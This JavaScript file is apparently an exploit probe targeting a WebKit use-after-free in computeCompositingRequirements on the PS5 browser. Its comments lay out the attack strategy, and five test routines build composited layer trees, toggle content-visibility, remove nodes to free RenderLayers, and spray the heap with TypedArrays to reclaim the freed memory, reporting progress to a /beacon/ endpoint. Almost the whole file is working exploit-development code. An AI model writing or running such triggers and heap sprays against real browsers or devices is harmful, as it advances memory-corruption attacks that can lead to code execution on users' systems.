// p207 — content-visibility RenderLayer UAF probe
//
// WebKit Bug #287908: heap-uaf in computeCompositingRequirements
//
// When content-visibility changes via setIsHiddenByOverflowTruncation,
// the old code set m_visibleContentStatusDirty directly without
// propagating to ancestor layers. This means computeCompositingRequirements
// can recurse into a stale z-order list referencing freed RenderLayers.
//
// Fix (2024): replaced direct dirtying with dirtyVisibleContentStatus()
// which propagates to ancestors. WebKit-1200 (Dec 2023) likely lacks fix.
//
// PS5 14.20: content-visibility YES (including auto), MutationObserver YES
//
// Strategy:
//  1. Build nested layer tree with content-visibility styling
//  2. Trigger overflow truncation to set isHiddenByOverflowTruncation
//  3. Remove child (frees RenderLayer)
//  4. Restore content-visibility to trigger stale z-order traversal
//  5. Heap spray with TypedArrays to reclaim freed memory
//
// Beacon prefix: V207-

(function() {
  function B(tag) {
    try {
      var x = new XMLHttpRequest();
      x.open('GET', '/beacon/V207-' + tag + '?t=' + Date.now(), false);
      x.send();
    } catch (e) {}
  }

  B('BOOT');

  var tests = [];
  var currentTest = 0;

  // ── TEST A: Basic content-visibility toggle + child removal ──
  tests.push({name: 'A-CV-BASIC', run: function(done) {
    try {
      // Create container with composited layers
      var container = document.createElement('div');
      container.style.cssText = 'position:relative; width:400px; height:400px; overflow:hidden; content-visibility:auto; contain-intrinsic-size:400px 400px;';
      document.body.appendChild(container);

      // Build nested layer tree
      var layers = [];
      var parent = container;
      for (var i = 0; i < 20; i++) {
        var layer = document.createElement('div');
        layer.style.cssText = 'position:absolute; left:' + (i*5) + 'px; top:' + (i*5) + 'px; width:' + (300-i*10) + 'px; height:' + (300-i*10) + 'px; z-index:' + (20-i) + '; background:rgba(' + (i*12) + ',100,200,0.5); will-change:transform;';
        parent.appendChild(layer);
        layers.push(layer);
        parent = layer;
      }
      B('A-LAYERS-' + layers.length);

      // Force initial layout
      var _ = container.offsetHeight;

      // Step 1: Set content-visibility to hidden (triggers setIsHiddenByOverflowTruncation)
      container.style.contentVisibility = 'hidden';
      B('A-CV-HIDDEN');

      // Force layout
      _ = container.offsetHeight;

      // Step 2: Remove a middle layer (frees its RenderLayer)
      var targetLayer = layers[10];
      var targetParent = targetLayer.parentNode;
      targetParent.removeChild(targetLayer);
      B('A-CHILD-REMOVED');

      // Step 3: After a tick, restore content-visibility to auto
      // This triggers computeCompositingRequirements with stale z-order
      setTimeout(function() {
        container.style.contentVisibility = 'auto';
        B('A-CV-RESTORED');

        // Force layout — this is where the UAF should trigger
        try {
          _ = container.offsetHeight;
          _ = document.body.offsetHeight;
          B('A-LAYOUT-OK');
        } catch (e) {
          B('A-LAYOUT-ERR-' + e.name);
        }

        // Check if we survived
        setTimeout(function() {
          B('A-SURVIVED');
          container.remove();
          done();
        }, 500);
      }, 50);

    } catch (e) {
      B('A-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST B: Overflow truncation path + heap spray ──
  tests.push({name: 'B-OVERFLOW-SPRAY', run: function(done) {
    try {
      var outer = document.createElement('div');
      outer.style.cssText = 'position:relative; width:200px; height:100px; overflow:hidden;';
      document.body.appendChild(outer);

      var inner = document.createElement('div');
      inner.style.cssText = 'position:relative; width:200px; height:500px; content-visibility:auto; contain-intrinsic-size:200px 500px;';
      outer.appendChild(inner);

      // Build deep composited tree inside
      var deepLayers = [];
      var p = inner;
      for (var i = 0; i < 30; i++) {
        var d = document.createElement('div');
        d.style.cssText = 'position:relative; z-index:' + i + '; width:180px; height:30px; background:hsl(' + (i*12) + ',70%,50%); will-change:opacity;';
        p.appendChild(d);
        deepLayers.push(d);
        if (i % 3 === 0) p = d;
      }
      B('B-TREE-BUILT-' + deepLayers.length);

      var _ = outer.offsetHeight;

      // Scroll to push inner content into overflow truncation zone
      outer.scrollTop = 400;
      B('B-SCROLLED');

      // MutationObserver to catch tree modifications
      var moFired = 0;
      var mo = new MutationObserver(function(mutations) {
        moFired++;
        if (moFired === 1) {
          B('B-MO-FIRST');
          // During MO callback, remove layers and spray heap
          for (var j = 15; j < 30; j++) {
            if (deepLayers[j].parentNode) {
              deepLayers[j].parentNode.removeChild(deepLayers[j]);
            }
          }
          B('B-REMOVED-15-LAYERS');

          // Heap spray to reclaim freed RenderLayer memory
          var spray = [];
          for (var k = 0; k < 5000; k++) {
            spray.push(new Uint8Array(128)); // ~RenderLayer size
          }
          B('B-SPRAYED-5000');
        }
      });
      mo.observe(inner, {childList: true, subtree: true});

      // Toggle content-visibility to trigger the bug
      inner.style.contentVisibility = 'hidden';
      _ = outer.offsetHeight;

      // Remove trigger node
      if (deepLayers[10].parentNode) {
        deepLayers[10].parentNode.removeChild(deepLayers[10]);
      }
      B('B-TRIGGER-REMOVED');

      setTimeout(function() {
        // Restore to auto — triggers compositing traversal
        inner.style.contentVisibility = 'auto';
        B('B-CV-AUTO');

        // Force compositing update
        try {
          _ = outer.offsetHeight;
          _ = inner.getBoundingClientRect();
          B('B-COMPOSITING-OK');
        } catch (e) {
          B('B-COMPOSITING-ERR-' + e.name);
        }

        setTimeout(function() {
          B('B-MO-TOTAL-' + moFired);
          mo.disconnect();
          outer.remove();
          done();
        }, 1000);
      }, 100);

    } catch (e) {
      B('B-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST C: Z-order list stale reference via position changes ──
  tests.push({name: 'C-ZORDER-STALE', run: function(done) {
    try {
      var container = document.createElement('div');
      container.style.cssText = 'position:relative; width:400px; height:400px; overflow:auto; content-visibility:auto;';
      document.body.appendChild(container);

      // Create z-ordered layers with positive and negative z-index
      var posLayers = [];
      var negLayers = [];
      for (var i = 0; i < 10; i++) {
        var pos = document.createElement('div');
        pos.style.cssText = 'position:absolute; z-index:' + (i+1) + '; width:50px; height:50px; left:' + (i*40) + 'px; top:0; background:red; will-change:transform;';
        container.appendChild(pos);
        posLayers.push(pos);

        var neg = document.createElement('div');
        neg.style.cssText = 'position:absolute; z-index:-' + (i+1) + '; width:50px; height:50px; left:' + (i*40) + 'px; top:60px; background:blue; will-change:transform;';
        container.appendChild(neg);
        negLayers.push(neg);
      }
      B('C-ZORDER-BUILT');

      var _ = container.offsetHeight;

      // Step 1: Hide via content-visibility
      container.style.contentVisibility = 'hidden';
      _ = container.offsetHeight;
      B('C-HIDDEN');

      // Step 2: Remove positive z-order layers (frees their RenderLayers)
      for (var j = 0; j < posLayers.length; j++) {
        posLayers[j].remove();
      }
      B('C-POS-REMOVED');

      // Heap spray
      var spray = [];
      for (var k = 0; k < 10000; k++) {
        spray.push(new Uint8Array(64));
      }
      B('C-SPRAYED');

      // Step 3: Toggle back to auto — stale positive z-order list references
      setTimeout(function() {
        container.style.contentVisibility = 'auto';
        B('C-AUTO');

        // Force full compositing update
        try {
          _ = container.offsetHeight;
          container.style.width = '401px';
          _ = container.offsetHeight;
          B('C-LAYOUT-OK');
        } catch (e) {
          B('C-LAYOUT-ERR-' + e.name);
        }

        setTimeout(function() {
          B('C-SURVIVED');
          container.remove();
          spray = null;
          done();
        }, 500);
      }, 100);
    } catch (e) {
      B('C-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST D: will-change + content-visibility interaction ──
  tests.push({name: 'D-WILLCHANGE-CV', run: function(done) {
    try {
      var wrapper = document.createElement('div');
      wrapper.style.cssText = 'position:relative; width:500px; height:500px;';
      document.body.appendChild(wrapper);

      // Composited parent
      var composited = document.createElement('div');
      composited.style.cssText = 'position:absolute; will-change:transform; width:400px; height:400px; overflow:hidden;';
      wrapper.appendChild(composited);

      // content-visibility container inside composited layer
      var cvContainer = document.createElement('div');
      cvContainer.style.cssText = 'content-visibility:auto; contain-intrinsic-size:400px 800px; position:relative;';
      composited.appendChild(cvContainer);

      // Many layers inside
      var children = [];
      for (var i = 0; i < 40; i++) {
        var child = document.createElement('div');
        child.style.cssText = 'position:relative; z-index:' + (i % 5) + '; height:20px; will-change:' + (i % 2 ? 'opacity' : 'transform') + '; background:hsl(' + (i*9) + ',80%,60%);';
        child.textContent = 'Layer ' + i;
        cvContainer.appendChild(child);
        children.push(child);
      }
      B('D-BUILT-40');

      var _ = wrapper.offsetHeight;

      // Rapid toggle cycle
      var cycle = 0;
      function toggleCycle() {
        if (cycle >= 10) {
          B('D-CYCLES-DONE');
          wrapper.remove();
          done();
          return;
        }
        cycle++;

        // Hide
        cvContainer.style.contentVisibility = 'hidden';
        _ = wrapper.offsetHeight;

        // Remove some children
        var removed = [];
        for (var j = children.length - 1; j >= children.length - 5; j--) {
          if (children[j] && children[j].parentNode) {
            children[j].parentNode.removeChild(children[j]);
            removed.push(children.splice(j, 1)[0]);
          }
        }

        // Spray
        var spray = [];
        for (var k = 0; k < 2000; k++) {
          spray.push(new ArrayBuffer(96));
        }

        // Restore
        cvContainer.style.contentVisibility = 'auto';
        try {
          _ = wrapper.offsetHeight;
          _ = composited.getBoundingClientRect();
        } catch (e) {
          B('D-CYCLE-' + cycle + '-ERR');
        }

        spray = null;

        // Re-add some children for next cycle
        for (var m = 0; m < 3; m++) {
          var newChild = document.createElement('div');
          newChild.style.cssText = 'position:relative; z-index:' + ((cycle*3+m) % 5) + '; height:20px; will-change:opacity; background:green;';
          cvContainer.appendChild(newChild);
          children.push(newChild);
        }

        if (cycle === 5) B('D-CYCLE-5');
        setTimeout(toggleCycle, 50);
      }
      toggleCycle();

    } catch (e) {
      B('D-ERR-' + e.name);
      done();
    }
  }});

  // ── TEST E: IntersectionObserver + content-visibility race ──
  tests.push({name: 'E-IO-CV-RACE', run: function(done) {
    try {
      var scroller = document.createElement('div');
      scroller.style.cssText = 'height:200px; overflow:auto;';
      document.body.appendChild(scroller);

      var sections = [];
      for (var i = 0; i < 30; i++) {
        var sec = document.createElement('div');
        sec.style.cssText = 'content-visibility:auto; contain-intrinsic-size:100% 150px; position:relative;';
        // Each section has composited children
        for (var j = 0; j < 5; j++) {
          var child = document.createElement('div');
          child.style.cssText = 'position:relative; z-index:' + j + '; height:30px; will-change:transform; background:hsl(' + (i*12+j*60) + ',60%,50%);';
          sec.appendChild(child);
        }
        scroller.appendChild(sec);
        sections.push(sec);
      }
      B('E-SECTIONS-30');

      var ioHits = 0;
      var io = new IntersectionObserver(function(entries) {
        ioHits += entries.length;
        // During IO callback, toggle content-visibility and remove children
        entries.forEach(function(entry) {
          if (!entry.isIntersecting && entry.target.children.length > 0) {
            // Hidden section — toggle CV and remove children
            entry.target.style.contentVisibility = 'hidden';
            while (entry.target.firstChild) {
              entry.target.removeChild(entry.target.firstChild);
            }
            entry.target.style.contentVisibility = 'auto';
          }
        });
      }, {root: scroller, threshold: 0});

      sections.forEach(function(s) { io.observe(s); });

      // Rapid scrolling to trigger IO + CV interactions
      var scrollStep = 0;
      function scrollLoop() {
        if (scrollStep >= 20) {
          B('E-IO-HITS-' + ioHits);
          io.disconnect();
          scroller.remove();
          done();
          return;
        }
        scrollStep++;
        scroller.scrollTop = scrollStep * 200;

        // Force layout during scroll
        var _ = scroller.offsetHeight;

        // Spray between scrolls
        var spray = [];
        for (var k = 0; k < 1000; k++) {
          spray.push(new Uint8Array(128));
        }
        spray = null;

        setTimeout(scrollLoop, 30);
      }
      scrollLoop();

    } catch (e) {
      B('E-ERR-' + e.name);
      done();
    }
  }});

  // ── Run all tests ──
  function runNext() {
    if (currentTest >= tests.length) {
      B('ALL-DONE');
      return;
    }
    var t = tests[currentTest++];
    B(t.name + '-START');

    var completed = false;
    var timeout = setTimeout(function() {
      if (!completed) { completed = true; B(t.name + '-TIMEOUT'); runNext(); }
    }, 15000);

    t.run(function() {
      if (!completed) { completed = true; clearTimeout(timeout); B(t.name + '-END'); setTimeout(runNext, 300); }
    });
  }

  runNext();
})();
